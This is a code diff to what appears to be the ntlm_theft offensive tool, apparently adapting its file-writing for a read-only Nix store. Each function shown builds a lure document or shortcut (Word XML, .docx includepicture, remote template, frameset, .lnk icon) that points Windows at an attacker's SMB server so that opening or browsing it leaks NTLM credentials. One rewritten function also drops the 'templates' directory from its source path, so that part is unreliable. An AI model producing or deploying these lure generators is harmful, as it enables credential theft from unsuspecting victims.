@@ -29,6 +29,7 @@ import os
 import shutil
 import xlsxwriter
 from sys import exit
+import tempfile
 
 #the basic path of the script, make it possible to run from anywhere
 script_directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'share', 'ntlm_theft')
@@ -131,19 +132,22 @@ def create_xml(generate,server,filename):
 
 # .xml with remote includepicture field attack
 # Filename: shareattack.xml, action=open, attacks=word
-def create_xml_includepicture(generate,server, filename):
-	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
-	# Read the template file
-	file = open(documentfilename, 'r', encoding="utf8")
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(filename, 'w', encoding="utf8")
-	file.write(filedata)
-	file.close()
-	print("Created: " + filename + " (OPEN)")
+def create_xml_includepicture(generate, server, filename):
+    # Source path (read-only in Nix store)
+    documentfilename = os.path.join(script_directory, "templates", "includepicture-template.xml")
+    
+    # Read the template file
+    with open(documentfilename, 'r', encoding="utf8") as file:
+        filedata = file.read()
+    
+    # Replace the target string
+    filedata = filedata.replace('127.0.0.1', server)
+    
+    # Write the modified data to the specified output file
+    with open(filename, 'w', encoding="utf8") as file:
+        file.write(filedata)
+    
+    print(f"Created: {filename} (OPEN)")
 
 # .htm with remote image attack
 # Filename: shareattack.htm, action=open, attacks=internet explorer + Edge + Chrome when launched from desktop
@@ -157,81 +161,78 @@ def create_htm(generate,server,filename):
 	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
 
 # .docx file with remote includepicture field attack
-def create_docx_includepicture(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
-	# Destination path  
-	dest = os.path.join("docx-includepicture-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
-	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
-	# Read the template file
-	file = open(documentfilename, 'r')
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(documentfilename, 'w')
-	file.write(filedata)
-	file.close()
-	shutil.make_archive(filename, 'zip', "docx-includepicture-template")
-	os.rename(filename +".zip",filename)
-	shutil.rmtree("docx-includepicture-template")
-	print("Created: " + filename + " (OPEN)")
+def create_docx_includepicture(generate, server, filename):
+    # Source path (read-only in Nix store)
+    src = os.path.join(script_directory, "docx-includepicture-template")
+    
+    # Temporary destination path
+    with tempfile.TemporaryDirectory() as temp_dir:
+        dest = os.path.join(temp_dir, "docx-includepicture-template")
+        # Copy the template to the writable temporary directory
+        shutil.copytree(src, dest)
+        
+        # Modify the document.xml.rels file in the temporary directory
+        documentfilename = os.path.join(dest, "word", "_rels", "document.xml.rels")
+        with open(documentfilename, 'r') as file:
+            filedata = file.read()
+        filedata = filedata.replace('127.0.0.1', server)
+        with open(documentfilename, 'w') as file:
+            file.write(filedata)
+        
+        # Create the .docx archive from the modified template
+        shutil.make_archive(filename, 'zip', dest)
+        os.rename(filename + ".zip", filename)
+        print(f"Created: {filename} (OPEN)")
 
 # .docx file with remote template attack
 # Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
 # Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
-def create_docx_remote_template(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
-	# Destination path  
-	dest = os.path.join("docx-remotetemplate-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
-	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
-	# Read the template file
-	file = open(documentfilename, 'r')
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(documentfilename, 'w')
-	file.write(filedata)
-	file.close()
-	shutil.make_archive(filename, 'zip', "docx-remotetemplate-template")
-	os.rename(filename +".zip",filename)
-	shutil.rmtree("docx-remotetemplate-template")
-	print("Created: " + filename + " (OPEN)")
+def create_docx_remote_template(generate, server, filename):
+    # Source path (read-only in Nix store)
+    src = os.path.join(script_directory, "templates", "docx-remotetemplate-template")
+    
+    # Temporary destination path
+    with tempfile.TemporaryDirectory() as temp_dir:
+        dest = os.path.join(temp_dir, "docx-remotetemplate-template")
+        # Copy the template to the writable temporary directory
+        shutil.copytree(src, dest)
+        
+        # Modify the settings.xml.rels file in the temporary directory
+        documentfilename = os.path.join(dest, "word", "_rels", "settings.xml.rels")
+        with open(documentfilename, 'r') as file:
+            filedata = file.read()
+        filedata = filedata.replace('127.0.0.1', server)
+        with open(documentfilename, 'w') as file:
+            file.write(filedata)
+        
+        # Create the .docx archive from the modified template
+        shutil.make_archive(filename, 'zip', dest)
+        os.rename(filename + ".zip", filename)
+        print(f"Created: {filename} (OPEN)")
 
 # .docx file with Frameset attack
-def create_docx_frameset(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
-	# Destination path  
-	dest = os.path.join("docx-frameset-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
-	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
-	# Read the template file
-	file = open(documentfilename, 'r')
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(documentfilename, 'w')
-	file.write(filedata)
-	file.close()
-	shutil.make_archive(filename, 'zip', "docx-frameset-template")
-	os.rename(filename +".zip",filename)
-	shutil.rmtree("docx-frameset-template")
-	print("Created: " + filename + " (OPEN)")
+def create_docx_frameset(generate, server, filename):
+    # Source path (read-only in Nix store)
+    src = os.path.join(script_directory, "templates", "docx-frameset-template")
+    
+    # Temporary destination path
+    with tempfile.TemporaryDirectory() as temp_dir:
+        dest = os.path.join(temp_dir, "docx-frameset-template")
+        # Copy the template to the writable temporary directory
+        shutil.copytree(src, dest)
+        
+        # Modify the webSettings.xml.rels file in the temporary directory
+        documentfilename = os.path.join(dest, "word", "_rels", "webSettings.xml.rels")
+        with open(documentfilename, 'r') as file:
+            filedata = file.read()
+        filedata = filedata.replace('127.0.0.1', server)
+        with open(documentfilename, 'w') as file:
+            file.write(filedata)
+        
+        # Create the .docx archive from the modified template
+        shutil.make_archive(filename, 'zip', dest)
+        os.rename(filename + ".zip", filename)
+        print(f"Created: {filename} (OPEN)")
 
 # .xlsx file with cell based attack
 def create_xlsx_externalcell(generate,server,filename):
@@ -414,22 +415,35 @@ IconResource=\\\\''' + server + '''\\aa''')
 
 # .lnk remote IconFile Attack
 # Filename: shareattack.lnk, action=browse, attacks=explorer
-def create_lnk(generate,server,filename):
-	# these two numbers define location in template that holds icon location
-	offset = 0x136
-	max_path = 0xDF
-	unc_path = f'\\\\{server}\\tools\\nc.ico'
-	if len(unc_path) >= max_path:
-		print("Server name too long for lnk template, skipping.")
-		return
-	unc_path = unc_path.encode('utf-16le')
-	with open(os.path.join(script_directory,"templates", "shortcut-template.lnk"), 'rb') as lnk:
-		shortcut = list(lnk.read())
-	for i in range(0, len(unc_path)):
-		shortcut[offset + i] = unc_path[i]
-	with open(filename,'wb') as file:
-		file.write(bytes(shortcut))
-	print("Created: " + filename + " (BROWSE TO FOLDER)")
+def create_lnk(generate, server, filename):
+    # these two numbers define location in template that holds icon location
+    offset = 0x136
+    max_path = 0xDF
+    unc_path = f'\\\\{server}\\tools\\nc.ico'
+    if len(unc_path) >= max_path:
+        print("Server name too long for lnk template, skipping.")
+        return
+    unc_path = unc_path.encode('utf-16le')
+
+    # Source path (read-only in Nix store)
+    src = os.path.join(script_directory, "templates", "shortcut-template.lnk")
+    
+    # Temporary destination path
+    with tempfile.TemporaryDirectory() as temp_dir:
+        temp_file = os.path.join(temp_dir, "shortcut-template.lnk")
+        shutil.copy2(src, temp_file)  # Copy template to temporary location
+        
+        # Modify the template
+        with open(temp_file, 'rb') as lnk:
+            shortcut = list(lnk.read())
+        for i in range(0, len(unc_path)):
+            shortcut[offset + i] = unc_path[i]
+        
+        # Write the modified shortcut to the specified filename
+        with open(filename, 'wb') as file:
+            file.write(bytes(shortcut))
+        
+        print(f"Created: {filename} (BROWSE TO FOLDER)")
 
 
 # create folder to hold templates, if already exists delete it
